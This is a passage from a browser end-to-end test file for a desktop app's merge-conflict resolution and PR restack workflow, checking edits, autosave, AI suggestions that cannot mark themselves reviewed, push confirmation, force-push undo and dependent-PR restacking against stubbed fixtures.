    await wait("window.conflictFixture.files[0].result.includes('<<<<<<<') && !window.conflictFixture.files[0].result.includes('// merged by hand')");
    assert.equal(await stage(), 'conflicted');
    // Conflict markers typed in an edit keep the conflict in Decide, and Mark reviewed stays away.
    await editInline(0, '<<<<<<< mine\n');
    await wait(`${block(0)}?.dataset.state==='open' && ${block(0)}?.hasAttribute('data-edited')`);
    assert.equal(await js(`${block(0)}.querySelector('.conflict-bucket').dataset.bucket`), 'decide');
    assert.equal(await stage(), 'conflicted');
    assert.equal(await primary(), 'next-conflict');
    await key('m');
    assert.equal(await js('window.conflictFixture.files[0].resolved'), false);
    await captureAll('inline-edit-markers');
    // Reopened, an edit with a marker is still a Decide card with its Undo: the file never gets stuck.
    await reopen('open');
    assert.ok(await js(`${block(0)}.hasAttribute('data-edited')`));
    assert.equal(await stage(), 'conflicted');
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='open' && !${block(0)}?.hasAttribute('data-edited')`);
    // Cancel (Escape) leaves the draft as it was, and the workspace stays open.
    await js(`${block(0)}.querySelector('[data-conflict-edit]').click()`);
    await wait(`!!${inlineEditor(0)} && ${inlineEditor(0)}.getRootNode().activeElement===${inlineEditor(0)}`);
    await captureAll('inline-edit-open');
    await key('Escape');
    await wait(`!document.querySelector('[data-conflict-inline-edit]') && ${block(0)}?.dataset.state==='open'`);
    assert.ok(await js("!!document.querySelector('.conflict-workspace')"), 'Escape in the editor closes only the editor');
    await js(`${block(0)}.focus()`);
    await key('3');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    // Autosave stores the draft without marking the file reviewed.
    await wait(
      "window.conflictFixture.files[0].result.includes('Math.max') && window.conflictFixture.files[0].result.includes('retries = 3')"
    );
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    assert.equal(await js('window.conflictFixture.files[0].resolved'), false);
    assert.equal(
      await js("document.querySelector('.conflict-workspace').textContent.includes('Unsaved changes')"),
      false
    );
    // Another writer moves the draft on (an open in another view, its checks) without touching this file: your next
    // save still lands, on the newer draft, with no error.
    const mine = await js<string>('window.conflictFixture.files[0].result');
    await js('window.conflictFixture.version+=2');
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait("window.conflictFixture.files[0].result.includes('<<<<<<<') && document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    assert.equal(await js("!!document.querySelector('[data-conflict-held]')"), false);
    // Another view saves this same file meanwhile: your edit is refused, nothing is overwritten, and the footer asks.
    const theirs = await js<string>("window.conflictFixture.files[0].result=window.conflictFixture.files[0].original.replace('retries = 5','retries = 6')");
    await js('window.conflictFixture.version++');
    await js(`${block(0)}.focus()`);
    await key('3');
    await wait("!!document.querySelector('[data-conflict-held]')");
    assert.equal(await js('window.conflictFixture.files[0].result'), theirs, 'The other view’s text stays');
    assert.equal(await js("document.querySelector('.conflict-save-state').textContent"), 'Not saved');
    assert.match(await js<string>("document.querySelector('[data-conflict-held]').textContent"), /retry\.ts isn’t saved/);
    await captureAll('save-held');
    // Keep my edit reads the saved draft and puts your edit on it; the next save keeps it.
    await click('Keep my edit');
    await wait(
      `!document.querySelector('[data-conflict-held]') && window.conflictFixture.files[0].result===${JSON.stringify(mine)} && document.querySelector('.conflict-save-state')?.textContent==='Saved'`
    );
    await captureAll('file-resolved');

    // The result is on screen in Compare with: PR, so Mark reviewed is the next step.
    assert.equal(await primary(), 'mark-reviewed');
    assert.equal(
      await js("document.querySelector('.conflict-compare [data-compare=pr]')?.getAttribute('aria-pressed')"),
      'true'
    );

    // Structural merge already ran on every file: what is left is asking the model about this file, with the Bot icon.
    const ask = "document.querySelector('.conflict-suggest-trigger')";
    assert.match(await js<string>(`${ask}.textContent`), /^Ask .+…$/);
    assert.match(await js<string>(`${ask}.querySelector('svg').getAttribute('class')`), /lucide-bot/);
    await js(`${ask}.click()`);
    await wait("document.querySelector('.conflict-suggest-form textarea')");
    assert.equal(await js("!!document.querySelector('.conflict-suggest-item')"), false, 'No engine menu');
    assert.equal(await exists('Structural merge'), false);
    await js(
      `(()=>{const input=document.querySelector('.conflict-suggest-form textarea');Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value').set.call(input,'Keep the minimum delay.');input.dispatchEvent(new Event('input',{bubbles:true}));})()`
    );
    await capture('suggest-ask');
    await js("[...document.querySelectorAll('.conflict-suggest-form button')].at(-1).click()");
    // A suggestion never overrides your choices (the service offers its parts only for open conflicts): both conflicts
    // keep what you kept, and the footer says the suggestion differed.
    await wait("document.querySelector('.conflict-footer-status')?.textContent.includes('Preserved the minimum')");
    assert.equal(await js("window.conflictCalls.find(r=>r.kind==='resolve').instructions"), 'Keep the minimum delay.');
    assert.equal(await js("window.conflictCalls.find(r=>r.kind==='resolve').path"), 'src/retry.ts');
    assert.equal(
      await js('window.conflictFixture.files[0].resolved'),
      false,
      'Agent cannot mark its own proposal reviewed'
    );
    assert.match(
      await js<string>("document.querySelector('.conflict-footer-status').textContent"),
      /already decided; those keep their text/
    );
    assert.equal(await js(`${block(0)}?.dataset.state`), 'kept');
    assert.equal(await js(`${block(1)}?.dataset.state`), 'kept');
    // Your draft, in the diff against the PR; the file waits only for Mark reviewed.
    await wait("!!document.querySelector('.conflict-compare-diff[data-compare=pr]:not([hidden]) diffs-container')");
    assert.equal(await stage(), 'resolved');
    assert.equal(await primary(), 'mark-reviewed');
    await capture('proposal');

    // Three PRs stack on this one: the cascade preview (#445 item 22) runs once every file is reviewed.
    await js(`(()=>{
      window.conflictFixture.dependents=[121,122,123].map(n=>'https://github.com/klang/engine/pull/'+n);
      window.cascadeAsks=[];window.cascadeState={state:'checking'};
      window.electronAPI.conflictCascade=async(id,version,retry)=>{window.cascadeAsks.push({version,retry});return structuredClone(window.cascadeState);};
      window.electronAPI.onConflictCascadeChanged=cb=>{window.cascadeChanged=cb;return()=>{};};
    })()`);
    // Marking the last file reviewed goes straight to the confirmation, which shows the final update.
    await click('Mark reviewed');
    await wait("document.querySelector('.conflict-confirm .step-card')");
    assert.equal(await js('window.conflictFixture.files[0].resolved'), true);
    assert.equal(await publishes(), 0, 'Reviewing and previewing never publish');
    assert.equal(await js("!!document.querySelector('.conflict-workspace .step-list')"), false, 'No step rail');
    assert.equal(
      await js("!!document.querySelector('.conflict-confirm .step-list,.conflict-confirm .step-card-count')"),
      false
    );
    const confirmText = await js<string>("document.querySelector('.conflict-confirm').innerText");
    assert.match(confirmText, /Pushes to (@\S+’s|your|the author’s) branch/);
    assert.match(confirmText, /Approvals may be dismissed if the repository requires it\./);
    // Three groups (#445 item 12): you kept both conflicts (the suggestion never overrode them); main brings
    // src/clock.ts. You decided is open, the other two are collapsed.
    assert.deepEqual(await confirmGroupsShown(), {
      decided: { count: '2 conflicts in 1 file', open: 'true' },
      main: { count: '1 file', open: 'false' },
    });
    assert.match(confirmText, /You decided ·\s+2 conflicts in 1 file/);
    // An empty group doesn't show (#445 distill). The counts head the page, each a way to its group, and the page
    // scrolls under a bar that keeps the message and Push in view.
    assert.deepEqual(await js("[...document.querySelectorAll('[data-confirm-jump]')].map(b=>b.dataset.confirmJump)"), ['decided', 'main']);
    const pushInView = () =>
      js<boolean>(
        `(()=>{const p=(${visibleButton('Push merge commit')}).getBoundingClientRect();const m=document.querySelector('.conflict-confirm-message input').getBoundingClientRect();const v=document.querySelector('.conflict-confirm').getBoundingClientRect();return p.top>=v.top&&p.bottom<=v.bottom+0.5&&m.top>=v.top&&m.bottom<=v.bottom+0.5})()`
      );
    assert.ok(await pushInView(), 'Push and the message are in view');
    await js("document.querySelector('.conflict-confirm').scrollTop=1e6");
    assert.ok(await pushInView(), 'Push and the message stay in view at the end of the page');
    await js("document.querySelector('.conflict-confirm').scrollTop=0");
    assert.deepEqual(
      await js("[...document.querySelectorAll('[data-confirm-group=decided] [data-confirm-how]')].map(e=>e.textContent)"),
      ['Conflict 1 of 2 · Kept both changes', 'Conflict 2 of 2 · Kept main’s change']
    );
    assert.doesNotMatch(confirmText, /Your resolutions|Changes coming from/);
    assert.equal((confirmText.match(/Nothing is pushed/g) ?? []).length, 1, 'Say “nothing pushed” once');
    await wait("document.activeElement?.classList.contains('step-card-body')");
    // Its diff is the Conflicts view's (ConflictFileDiff over ChangesDiff), with Quiet off.
    await wait(
      "document.querySelector('[data-confirm-group=decided] .conflict-diff-file diffs-container')?.shadowRoot?.querySelector('[data-line]')"
    );
    assert.equal(await js("!!document.querySelector('[data-confirm-group=decided] [data-noise-stat]')"), false);
    // Undo after push is off for this repository: the confirmation says so once, with the setting.
    assert.match(await js<string>(`${note('undo')}.textContent`), /^Undo after push is off for this repository.*Repository settings$/);
    await captureAll('confirm-push');
    // The cascade preview: "Checking the stack…" while the dry run runs, then the sentence, which follows the result.
    await wait("document.querySelector('.conflict-confirm [data-cascade=checking]')?.textContent==='Checking the stack…'");
    assert.equal(
      await js('window.cascadeAsks.at(-1).version'),
      await js('window.conflictFixture.version'),
      'It asks for the saved draft version'
    );
    const cascadeIs = (prs: string) =>
      js(`(()=>{
        const pr=(n,outcome,extra)=>({url:'https://github.com/klang/engine/pull/'+n,title:'PR '+n,outcome,merges:0,review:outcome!=='clean'&&outcome!=='merged',...extra});
        window.cascadeState={state:'ready',preview:{version:window.conflictFixture.version,url:window.conflictFixture.url,prs:${prs}}};
        window.cascadeChanged(window.conflictFixture.id);
      })()`);
    await cascadeIs("[pr(121,'merged'),pr(122,'clean'),pr(123,'conflicts',{conflicts:1})]");
    const sentence = "document.querySelector('.conflict-confirm [data-cascade-sentence]')?.textContent";
    await wait(`${sentence}==='Resolving #120 also settles #121 and #122. #123 has 1 new conflict.'`);
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-confirm [data-cascade-outcome]')].map(e=>e.textContent)"),
      [
        '#121 · Merged and checked · No review needed',
        '#122 · Replays cleanly · No review needed',
        '#123 · 1 new conflict to check or decide · Needs your review',
      ]
    );
    await captureAll('confirm-cascade');
    await cascadeIs("[pr(121,'merged'),pr(122,'clean',{merges:1,review:true}),pr(123,'carried')]");
    await wait(`${sentence}==='Resolving #120 also settles #121, #122 and #123.'`);
    assert.match(
      await js<string>("document.querySelector('.conflict-confirm [data-cascade-outcome=clean]').textContent"),
      /Recreates 1 merge commit · Needs your review/
    );
    // A failed check can be tried again from the confirmation.
    await js(`(()=>{window.cascadeState={state:'failed',message:'GitHub did not answer.'};window.cascadeChanged(window.conflictFixture.id);})()`);
    await wait("/Couldn’t check the stack: GitHub did not answer\\./.test(document.querySelector('.conflict-confirm [data-cascade=failed]')?.textContent ?? '')");
    await js("window.cascadeState={state:'checking'}");
    await js("[...document.querySelectorAll('.conflict-confirm [data-cascade=failed] button')].find(b=>b.textContent==='Check again').click()");
    await wait("window.cascadeAsks.at(-1).retry===true && !!document.querySelector('.conflict-confirm [data-cascade=checking]')");
    assert.equal(await publishes(), 0, 'The preview pushes nothing');
    assert.equal(await js(`(${visibleButton('Push merge commit')}).disabled`), false, 'It is advisory: Push stays as it was');
    // Later replies have no dependents, so the rest of this check runs as before.
    await js('delete window.conflictFixture.dependents');
    await js("document.querySelector('.conflict-confirm .step-card-body').focus()");
    await key('Enter');
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(await publishes(), 0, 'Enter alone never pushes');
    // Nor in the message, which sits in the bar beside Push (#445 distill).
    await js("document.querySelector('.conflict-confirm-message input').focus()");
    await key('Enter');
    await modEnter();
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(await publishes(), 0, 'Enter or Cmd+Enter in the message never pushes');
    // Not on the Push button either: Enter and Space do nothing there, and neither does the wrong modifier.
    await pushButton();
    await key('Enter');
    await key(' ');
    await modEnter(await js<boolean>("window.electronAPI.platform==='darwin'") ? 'ctrl' : 'meta');
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(await publishes(), 0, 'Only a click or Cmd+Enter on Push pushes');
    assert.equal(
      await js(`(${visibleButton('Push merge commit')}).getAttribute('aria-keyshortcuts')`),
      (await js<boolean>("window.electronAPI.platform==='darwin'")) ? 'Meta+Enter' : 'Control+Enter'
    );
    // Arriving from main opens to the clean file's diff, from the preview's patch.
    await js("document.querySelector('[data-confirm-group=main] .conflict-disclosure').click()");
    await wait(
      "document.querySelector('[data-confirm-group=main] .conflict-diff-file[aria-label=\"src/clock.ts\"] diffs-container')?.shadowRoot?.querySelector('[data-line]')"
    );
    await captureAll('confirm-push-main');
    await js("document.querySelector('[data-confirm-group=main] .conflict-disclosure').click()");
    await wait("document.querySelector('[data-confirm-group=main] .conflict-disclosure').getAttribute('aria-expanded')==='false'");

    // A push rejected because the branch moved: plain copy, nothing resent, Load latest changes.
    await js('window.failPublish=true');
    await click('Push merge commit');
    await wait("document.querySelector('.conflict-confirm .conflict-error')");
    assert.equal(
      await js("document.querySelector('.conflict-error-title').textContent"),
      'Someone pushed to feature/retry after you started.'
    );
    assert.match(
      await js<string>("document.querySelector('.conflict-error').textContent"),
      /Nothing was pushed\. Your resolutions are saved\./
    );
    assert.equal(await js("document.querySelector('.conflict-error-details').open"), false);
    assert.match(await js<string>("document.querySelector('.conflict-error-details pre').textContent"), /stale info/);
    assert.doesNotMatch(
      await js<string>("[...document.querySelectorAll('.conflict-error > div > p')].map(p=>p.textContent).join(' ')"),
      /rejected|Git could not|stale info/
    );
    await new Promise((r) => setTimeout(r, 400));
    assert.equal(await publishes(), 1, 'A failed push is never replayed');
    assert.ok(await js(`(${visibleButton('Push merge commit')}).disabled`));
    await captureAll('push-failed');
    await js('window.failPublish=false');
    await click('Load latest changes');
    await wait("window.conflictCalls.at(-1).kind==='open' && window.conflictCalls.at(-1).restart===true");
    await wait("document.querySelector('.conflict-files') && !document.querySelector('.conflict-confirm')");
    assert.equal(await publishes(), 1, 'Loading the latest changes only reads');
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='confirm'");
    await click('Review and push…');
    await click('Back to files');
    await wait("document.querySelector('.conflict-files')");
    await click('Review and push…');
    // Cmd+Enter (Ctrl+Enter off macOS) on the focused Push button pushes, once.
    await wait(`(${visibleButton('Push merge commit')}) && !(${visibleButton('Push merge commit')}).disabled`);
    await pushButton();
    await modEnter();

    // Outcome: the branch is updated, with the commit, what changed, checks, Done and an undo hint.
    await wait("document.querySelector('.conflict-outcome h2')?.textContent==='feature/retry updated'");
    assert.equal(await publishes(), 2);
    const outcome = await js<string>("document.querySelector('.conflict-outcome').innerText");
    assert.match(outcome, /Merge commit\s+ddddddd/);
    assert.match(outcome, /1 file resolved by you/);
    assert.match(outcome, /main’s changes included/);
    assert.match(outcome, /Checks restarting/);
    assert.match(outcome, /To undo, reset feature\/retry to\s+aaaaaaa/);
    await wait("document.activeElement?.textContent.trim()==='Done'");
    assert.ok(await exists('Open PR on GitHub'));
    await captureAll('published');

    // Reopened later, when the PR merges cleanly: nothing to resolve, and the last update only as history.
    await click('Done');
    await wait("!document.querySelector('.conflict-workspace')");
    await js("Object.assign(window.conflictFixture,{reopened:true,lastPush:{commitSha:'d'.repeat(40),headSha:'a'.repeat(40)}})");
    await open();
    await wait("document.querySelector('[data-conflict-reopened] h2')?.textContent==='Nothing to resolve'");
    const reopened = await js<string>("document.querySelector('[data-conflict-reopened]').innerText");
    assert.match(reopened, /This PR merges cleanly with main\./);
    assert.match(reopened, /Last update: merge commit\s+ddddddd\s+To undo it, reset feature\/retry to\s+aaaaaaa/);
    assert.doesNotMatch(reopened, /updated|Checks restarting|resolved by you/, 'The old result is not shown as news');
    assert.equal(await js("!!document.querySelector('.conflict-outcome, .step-list')"), false);
    await wait("document.activeElement?.textContent.trim()==='Done'");
    await captureAll('reopened-clean');
    await click('Done');
    await wait("!document.querySelector('.conflict-workspace')");
    await js('delete window.conflictFixture.reopened; delete window.conflictFixture.lastPush');
    await open();
    await wait("document.querySelector('.conflict-outcome h2')?.textContent==='feature/retry updated'");

    // Undo this update (#445 item 25). Off by default: only the manual steps are linked.
    const undoAction = "document.querySelector('.conflict-outcome [data-conflict-undo]')";
    assert.equal(await js(`!!${undoAction}`), false, 'The setting is off by default: no undo action');
    assert.match(
      await js<string>("document.querySelector('.conflict-outcome [data-conflict-undo-docs]')?.href ?? ''"),
      /docs\/conflict-resolution\.md#undo-an-update$/
    );
    // On for klang/engine: the action replaces the link. (tests/pr-actions-browser.ts covers the PR header.)
    const allowUndo = (allow: boolean) =>
      js(`(async()=>{const p=await window.electronAPI.loadPreferences();const r={...p.repositorySettings?.['klang/engine']};if(${allow})r.allowConflictUndo=true;else delete r.allowConflictUndo;const next={...p,repositorySettings:{...p.repositorySettings,'klang/engine':r}};await window.electronAPI.savePreferences(next);window.dispatchEvent(new CustomEvent('gnosis-preferences-changed',{detail:next}));})()`);
    await allowUndo(true);
    await wait(`!!${undoAction}`);
    const undoRefusal =
      "Error invoking remote method 'conflict-resolution': Error: Git could not complete this operation. remote: error: GH006: Protected branch update failed for refs/heads/feature/retry.\nremote: error: Cannot force-push to this branch\nerror: failed to push some refs";
    await js(`(()=>{
      window.beforeUndo=window.electronAPI.conflictResolution;
      window.electronAPI.conflictResolution=async req=>{
        if(req.kind!=='undo-publish')return window.beforeUndo(req);
        window.conflictCalls.push(req);const s=window.conflictFixture;
        if(req.version!==s.version)throw Error('The saved resolution changed. Reopen the workspace before continuing.');
        if(window.refuseUndo)throw Error(${JSON.stringify(undoRefusal)});
        s.status='editing';delete s.commitSha;s.version++;return {session:structuredClone(s)};
      };
    })()`);
    const undoDialog = "document.querySelector('[data-conflict-undo-dialog]')";
    await js(`${undoAction}.click()`);
    await wait(`!!${undoDialog}`);
    const confirmation = await js<string>(`${undoDialog}.innerText`);
    assert.match(confirmation, /Undo the update to feature\/retry\?/);
    assert.match(confirmation, /This force-pushes feature\/retry and rewrites its history\./);
    assert.match(confirmation, /Moves\s+feature\/retry\s+back to\s+aaaaaaa/);
    assert.match(confirmation, /still at the merge commit ddddddd/);
    await wait("document.activeElement?.textContent.trim()==='Cancel'");
    await captureAll('undo-confirm');
    // Enter on Cancel only cancels; Enter or Space on the push button does nothing.
    await key('Enter');
    await wait(`!${undoDialog}`);
    assert.equal(await calls('undo-publish'), 0, 'Enter alone never undoes');
    await js(`${undoAction}.click()`);
    await wait(`!!${undoDialog}`);
    await js("document.querySelector('[data-conflict-undo-push]').focus()");
    await key('Enter');
    await key(' ');
    assert.equal(await calls('undo-publish'), 0, 'Enter or Space on the button never undoes');
    assert.ok(await js(`!!${undoDialog}`));
    // GitHub refuses the force push: its message shows, and the undo is not sent again.
    await js('window.refuseUndo=true');
    await modEnter();
    await wait("document.querySelector('[data-conflict-undo-error]')");
    assert.equal(await calls('undo-publish'), 1);
    const refused = await js<string>("document.querySelector('[data-conflict-undo-error]').innerText");
    assert.match(refused, /GitHub refused to rewrite feature\/retry\./);
    assert.match(refused, /GH006: Protected branch update failed for refs\/heads\/feature\/retry\. Cannot force-push to this branch/);
    assert.ok(await js("document.querySelector('[data-conflict-undo-push]').disabled"), 'A refused undo is never resent');
    // The safe way left, in words: no revert or other commands to paste, and a link to the docs.
    assert.match(refused, /Ask the PR’s author, or someone who can push to klang\/engine, to reset feature\/retry to aaaaaaa\./);
    assert.match(refused, /How to undo this update/);
    assert.equal(await js("!!document.querySelector('[data-conflict-undo-error] [data-conflict-commands]')"), false);
    await captureAll('undo-refused');
    await key('Escape');
    await wait(`!${undoDialog}`);
    // Allowed: the branch goes back and the draft is editable again, with its files reviewed.
    await js('window.refuseUndo=false');
    await js(`${undoAction}.click()`);
    await wait(`!!${undoDialog} && !document.querySelector('[data-conflict-undo-error]')`);
    await js("document.querySelector('[data-conflict-undo-push]').click()");
    await wait(`!${undoDialog} && !document.querySelector('.conflict-outcome') && !!document.querySelector('.conflict-files')`);
    assert.equal(await calls('undo-publish'), 2);
    await wait("document.querySelector('.conflict-footer')?.textContent.includes('feature/retry is back at aaaaaaa. Your resolutions are saved.')");
    assert.match(await js<string>('document.body.innerText'), /feature\/retry is back at aaaaaaa/, 'A toast says so too');
    assert.equal(await stage(), 'reviewed', 'Your choices are intact');
    await captureAll('undone');
    // Back to the published fixture for the restack.
    await allowUndo(false);
    await js(
      "window.electronAPI.conflictResolution=window.beforeUndo;Object.assign(window.conflictFixture,{status:'published',commitSha:'d'.repeat(40)})"
    );
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");
    await open();
    await wait("document.querySelector('.conflict-outcome h2')?.textContent==='feature/retry updated'");

    // An undo Gnosis couldn't settle: it says what it knows and offers a way out, with no undo action.
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");
    await js("Object.assign(window.conflictFixture,{undoing:true,undoUnsettled:'elsewhere'})");
    await open();
    await wait("!!document.querySelector('[data-conflict-undo-unsettled=elsewhere]')");
    assert.match(
      await js<string>("document.querySelector('[data-conflict-undo-unsettled]').innerText"),
      /feature\/retry is at another commit, neither the merge commit nor the commit before it/
    );
    assert.ok(await exists('Keep my resolutions and start over'));
    assert.ok(await exists('Discard'));
    assert.equal(await js("!!document.querySelector('.conflict-outcome [data-conflict-undo]')"), false);
    await captureAll('undo-unsettled');
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");
    await js('delete window.conflictFixture.undoing; delete window.conflictFixture.undoUnsettled');
    await open();
    await wait("document.querySelector('.conflict-outcome h2')?.textContent==='feature/retry updated'");

    // Restacking is a separate, explicit preview-and-push flow after the root resolution.
    await js(`(()=>{
      window.conflictFixture.dependents=['https://github.com/klang/engine/pull/121','https://github.com/klang/engine/pull/122'];
      const original=window.electronAPI.conflictResolution;
      window.electronAPI.conflictResolution=async req=>{
        const s=window.conflictFixture;
        if(req.kind==='restack-prepare'){
          window.conflictCalls.push(req);s.restack={token:'e'.repeat(64),status:'prepared',rootSha:s.commitSha,expected:[{url:s.dependents[0],headSha:'a'.repeat(40),baseSha:'b'.repeat(40),headBranch:'feature/retry-121',baseBranch:'feature/retry'}],branches:[121,122].map((n,i)=>({url:'https://github.com/klang/engine/pull/'+n,title:i?'Make retry metrics observable':'Apply bounded retry delays',repo:'klang/engine',branch:'feature/retry-'+n,baseBranch:i?'feature/retry-121':'feature/retry',baseRepo:'klang/engine',baseSha:'b'.repeat(40),oldSha:'a'.repeat(40),newSha:'f'.repeat(40),commits:2,reused:i?0:1,merged:i?0:2,yours:i?1:0,review:!!i,patch:'',files:window.conflictPreview}))};s.version++;return {session:structuredClone(s)};
        }
        if(req.kind==='restack-save'){window.conflictCalls.push(req);const f=s.restack.blocked.files.find(f=>f.path===req.path);f.result=req.contents;f.resolved=req.resolved;if(f.verdict&&window.restackVerdictKey)f.verdict.key=window.restackVerdictKey(f);s.version++;return {session:structuredClone(s)};}
        if(req.kind==='restack-continue'){window.conflictCalls.push(req);if(window.failContinue){const m=window.failContinue;window.failContinue=undefined;throw Error(m);}if(window.nextPause){s.restack.blocked=window.nextPause;window.nextPause=undefined;}else{s.restack.status='prepared';s.restack.blocked=undefined;}s.version++;return {session:structuredClone(s)};}
        if(req.kind==='restack-publish'){window.conflictCalls.push(req);s.restack.status='published';s.version++;return {session:structuredClone(s)};}
        return original(req);
      };
    })()`);
    await click('Done');
    await wait("!document.querySelector('.conflict-workspace')");
    await open();
    await wait("document.querySelector('.restack-review [aria-current=step]')?.dataset.step==='rebase'");
    assert.deepEqual(
      await js("[...document.querySelectorAll('.restack-review .step-list li')].map(li=>li.dataset.step)"),
      ['rebase', 'review', 'push']
    );
    assert.ok(await exists('Skip'), 'Restacking is optional before it starts');
    await captureAll('restack-plan');
    await click('Prepare restack · 2 PRs');
    await wait("document.querySelectorAll('.restack-branch').length===2");
    // #445 item 21: #121's replay had only conflicts the checks merged, so it passes straight through. #122 has one you
    // resolved, so it stops for its Reviewed tick.
    assert.equal(
      await js("document.querySelectorAll('.restack-branch-header .restack-reviewed input').length"),
      1,
      'Only the update with a decision of yours has a review control, at its header'
    );
    assert.deepEqual(
      await js(
        "[...document.querySelectorAll('.restack-branch')].map(b=>[b.getAttribute('aria-label'),b.querySelector('.restack-merged')?.textContent??b.querySelector('.restack-reviewed')?.textContent])"
      ),
      [
        ['PR #121 update', 'Merged and checked · No review needed'],
        ['PR #122 update', 'Reviewed'],
      ]
    );
    assert.match(
      await js<string>("document.querySelector('.restack-branch p')?.textContent ?? ''"),
      /2 conflicts merged and checked/
    );
    assert.equal(await js("document.querySelector('.restack-review [aria-current=step]').dataset.step"), 'review');
    assert.equal(await exists('Skip'), false);
    assert.equal(await calls('restack-publish'), 0);
    assert.ok(
      await js("[...document.querySelectorAll('.restack-review [data-step-continue]')].every(b=>b.disabled)"),
      'Continue waits for every PR update to be reviewed'
    );
    assert.match(
      await js<string>("document.querySelector('.restack-review .step-card-status').textContent"),
      /0 of 1 PR update reviewed · Mark each update reviewed to continue/
    );
    await captureAll('restack-review');
    await js("document.querySelectorAll('.restack-reviewed input').forEach(input=>input.click())");
    await click('Continue');
    await wait("document.querySelector('.restack-review [aria-current=step]')?.dataset.step==='push'");
    assert.equal(await js("document.querySelectorAll('.restack-confirm li').length"), 2);
    await key('Enter');
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(await calls('restack-publish'), 0, 'Enter alone never pushes');
    await captureAll('restack-confirm');
    await click('Push 2 PR updates');
    await wait("document.querySelector('.restack-review h2').textContent==='Dependent PRs updated'");
    assert.deepEqual(await js("window.conflictCalls.find(r=>r.kind==='restack-publish').reviewed"), [
      'https://github.com/klang/engine/pull/122',
    ]);
    await captureAll('restack-published');
    await click('Close');
    // A paused restack uses the same conflict view as the main resolution.
    await js(`(async()=>{
      // A verdict counts only for the draft it was made for (its key), as the service saves it; a restack save checks
      // the new draft again, and the stand-in service does the same.
      const {verdictKey,disabledLanguages}=await import('/lib/conflict-verdict-key.ts');
      const {currentCodeIntelligence}=await import('/lib/use-syntax-contents.ts');
      window.restackVerdictKey=f=>verdictKey({...f},disabledLanguages(currentCodeIntelligence()));
      const s=window.conflictFixture;s.restack.status='blocked';
      // The pipeline merged the second conflict and checked it; the first needs you.
      const o=s.files[0].original,cut=o.lastIndexOf('<<<<<<<'),merged='export const retries = 4;\\n';
      s.restack.blocked={url:s.dependents[0],title:'Apply bounded retry delays',reason:'The restack is paused on a new conflict. Choose what to keep in each file, mark it reviewed, then continue. No dependent branches have been pushed.',paths:['src/retry.ts'],reused:0,merged:0,yours:0,files:[{...s.files[0],result:o.slice(0,cut)+merged,resolved:false,source:'mergiraf',proposals:[null,{source:'mergiraf',text:merged}],verdict:{key:'',verdict:{merged:true,note:'Structural merge combined both sides, and the result parses.'}}}]};
      const paused=s.restack.blocked.files[0];paused.verdict.key=window.restackVerdictKey(paused);
      window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:s.url}));
    })()`);
    await wait("document.querySelector('.restack-conflict-file .conflict-block[data-state=open]')");
    assert.equal(await js("!!document.querySelector('.restack-conflict-file textarea')"), false);
    assert.deepEqual(
      await js(
        "[...document.querySelector('.restack-conflict-file .conflict-block').querySelectorAll('.conflict-side-label')].map(e=>e.textContent)"
      ),
      ['This PR · feature/retry-121', 'Updated parent · feature/retry']
    );
    assert.ok(await js(`(${visibleButton('Continue restack')}).disabled`));
    assert.match(
      await js<string>("document.querySelector('.restack-review .step-card-status').textContent"),
      /Mark each file reviewed/
    );
    assert.equal(
      await js("document.querySelectorAll('.restack-conflict-file .conflict-block[data-state=open]').length"),
      1,
      'Only the conflict the pipeline left needs you'
    );
    assert.equal(
      await js("document.querySelectorAll('.restack-conflict-file .conflict-block[data-bucket=merged]').length"),
      1,
      'The merged conflict shows as Merged, in the same view as the main resolution'
    );
    // The paused file is in the Conflicts view's diff (#445 item 11): Changes' file header, Compare with named for a
    // restack, and no Edit result mode.
    const paused = "document.querySelector('.restack-conflict-file')";
    assert.equal(await js(`!!${paused}.querySelector('.conflict-diff-view .changes-file-header')`), true);
    assert.deepEqual(
      await js(`[...${paused}.querySelectorAll('.conflict-compare [data-compare]')].map(b=>b.textContent)`),
      ['Parent', 'This PR', 'both']
    );
    assert.equal(await exists('Edit result'), false);
    await captureAll('restack-paused');
    // Edit in place in a pause too: the draft takes your text in that conflict, and Undo opens it again.
    await editInline(0, '// replayed by hand\n', paused);
    await wait(`${paused}.querySelector('.conflict-block[data-conflict-index="0"]')?.dataset.state==='edited'`);
    await wait("window.conflictFixture.restack.blocked.files[0].result.includes('// replayed by hand')");
    assert.equal(
      await js(`${paused}.querySelectorAll('.conflict-block[data-bucket=merged]').length`),
      1,
      'The Merged conflict keeps its proposal'
    );
    await captureAll('restack-inline-edited');
    await js(`[...${paused}.querySelector('.conflict-block[data-conflict-index="0"]').querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${paused}.querySelector('.conflict-block[data-conflict-index="0"]')?.dataset.state==='open'`);
    await wait("!window.conflictFixture.restack.blocked.files[0].result.includes('// replayed by hand')");
    await js(
      "document.querySelector('.restack-conflict-file .conflict-block[data-state=open] [data-choice=theirs]').click()"
    );
    await wait("!document.querySelector('.restack-conflict-file .conflict-block[data-state=open]')");
    // Reset file returns the paused file to what the replay proposed, as in the main workspace.
    await js(`${paused}.querySelector('[data-restack-reset]').click()`);
    await wait(`${paused}.querySelector('.conflict-block[data-conflict-index="0"]')?.dataset.state==='open' && !${paused}.querySelector('[data-restack-reset]')`);
    await js(`${paused}.querySelector('.conflict-block[data-state=open] [data-choice=theirs]').click()`);
    await wait("!document.querySelector('.restack-conflict-file .conflict-block[data-state=open]')");
    // The pause scrolls in a diff scroller: its file and hunk headers pin as in the Conflicts view.
